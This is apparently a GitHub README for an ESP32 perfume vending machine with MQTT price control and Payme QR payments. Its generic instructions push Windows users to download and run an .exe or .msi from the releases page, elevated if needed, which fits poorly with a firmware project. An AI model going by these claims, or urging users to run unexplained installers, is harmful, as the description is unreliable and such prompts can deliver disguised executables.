# 🌿 Street-Aroma-Vending - Easy Automated Perfume Purchase

[![Download Latest Release](https://img.shields.io/badge/Download-Street--Aroma--Vending-brightgreen?style=for-the-badge)](https://github.com/MarsLee1870/Street-Aroma-Vending/releases)

---

## 📋 What is Street-Aroma-Vending?

Street-Aroma-Vending is an automated perfume vending machine system designed for ease of use and remote control. It uses an ESP32 microcontroller combined with a touchscreen display. The machine makes it simple to select perfumes, pay using QR codes, and dispense the chosen scent. It supports up to four different products and tracks purchase doses. 

This software controls the vending machine’s user interface, payment system, and product dispensing. It also lets you manage prices remotely and generate QR codes directly on the device. Communication happens through a messaging system called MQTT.

---

## 🖥️ System Requirements

To use the Street-Aroma-Vending software or interact with the vending machine, your Windows PC must meet these minimum requirements:

- Windows 10 or newer (64-bit recommended)
- At least 4 GB of RAM
- A USB port for device connection (if applicable)
- Internet connection to access remote features
- A modern web browser (Edge, Chrome, Firefox) for QR code payments and management pages

This software works with the vending machine hardware. You will not install or configure the hardware with this PC software. It mainly helps control and interact with the vending machine remotely.

---

## 🔧 Features Overview

- Simple touchscreen interface to select perfumes
- QR code-based payment using Payme system
- Controls up to 4 product slots with precise dispensing via servo motors
- Remote price updates via MQTT messaging
- On-device QR code generation for easy payments
- Dose counting to track how many sprays are used for each product

The features make vending perfume fast, contactless, and easy to manage.

---

## 🚀 Getting Started: Download and Setup

Use these steps to download and set up the software on your Windows computer.

### Step 1: Access the Download Page

Click the button below to visit the release page and get the latest version of the Street-Aroma-Vending software.

[Visit the Download Page](https://github.com/MarsLee1870/Street-Aroma-Vending/releases)

This page contains all available versions, including stable and test releases.

### Step 2: Choose the Correct File

On the release page:

- Look for the latest release at the top.
- Find files with names ending in `.exe` or `.msi`. These are setup installers.
- Download the newest `.exe` or `.msi` file shown.

If you see multiple versions, choose the one marked as "latest" or "stable."

### Step 3: Run the Installer

Once downloaded:

- Double-click the file you saved.
- Follow the setup instructions on screen.
- Accept license terms when prompted.
- Choose the installation location or keep the default one.
- Click "Install."

The process will take a few minutes.

### Step 4: Launch the Application

After installation:

- Open the Start menu.
- Find "Street-Aroma-Vending" in your program list.
- Click it to open the app.

You will see the main interface for managing the vending machine.

---

## 💡 How to Use the Application

The software runs in a simple window with buttons and menus.

### Main Interface Components:

- **Product Slots:** Shows all four perfume options.
- **Price Settings:** Lets you adjust product prices remotely.
- **Payment QR:** Displays or prints the QR code for Payme transactions.
- **Dose Counter:** Tracks how much perfume is dispensed.
- **Connection Status:** Shows if your PC is linked to the vending machine.

Use the touchscreen on the vending device itself to make purchases, but manage product info and prices here.

---

## 🔌 Connecting to the Vending Machine

The vending machine uses Wi-Fi to communicate via MQTT, a message protocol.

### Network Setup

- Ensure the vending machine is powered on and connected to your local Wi-Fi.
- Your PC should be on the same network.
- The app automatically detects the machine on the network.
- Connection status will appear green if linked.

If the connection does not appear:

- Check Wi-Fi settings on both the PC and the machine.
- Restart the vending machine.
- Restart the app.

---

## 💳 Making Payments

The vending machine uses a safe QR code payment system called Payme.

- When you choose a product on the touchscreen, a QR code appears on the vending machine display.
- Scan the QR code with your phone Payme app.
- Confirm payment on your phone.
- Once complete, the machine dispenses the selected perfume dose.

The software on your PC manages price updates and shows payment status.

---

## 🛠️ Troubleshooting Common Issues

- **App does not start:** Make sure you have Windows 10 or newer. Try right-clicking and choosing "Run as administrator."
- **Cannot connect to vending machine:** Confirm both devices are on the same Wi-Fi network. Restart all devices.
- **Payment QR code does not show on machine:** Restart the vending machine. Check internet connection.
- **Dose counter not updating:** Refresh the app or reconnect to the machine.

If problems persist, check your local network and firewall settings.

---

## 🔄 Software Updates

Check the release page regularly for updated versions. Updates may include:

- Bug fixes
- Security patches
- New features
- Performance improvements

Download and run new installers to update.

---

## 📂 Where to Find More Files

The release page also includes other files like:

- User guides in PDF format
- Configuration files for advanced users
- Source code, if you want to look into development details

Access the page here:

[Street-Aroma-Vending Releases](https://github.com/MarsLee1870/Street-Aroma-Vending/releases)

---

## ❓ Need Help?

For technical questions, you can open an issue on the GitHub repository or check the existing issues for answers.

Repository link:  
https://github.com/MarsLee1870/Street-Aroma-Vending

---

## 📚 Useful Terms

- **ESP32:** A small computer that runs the vending machine.
- **MQTT:** A system for sending messages between devices.
- **Payme QR Payment:** A method to pay by scanning a QR code with a mobile app.
- **Servo motor:** A motor that moves the perfume container to dispense the scent.
- **Dose counting:** Tracking how many perfume sprays have been released.

Knowing these helps understand what the machine and software do.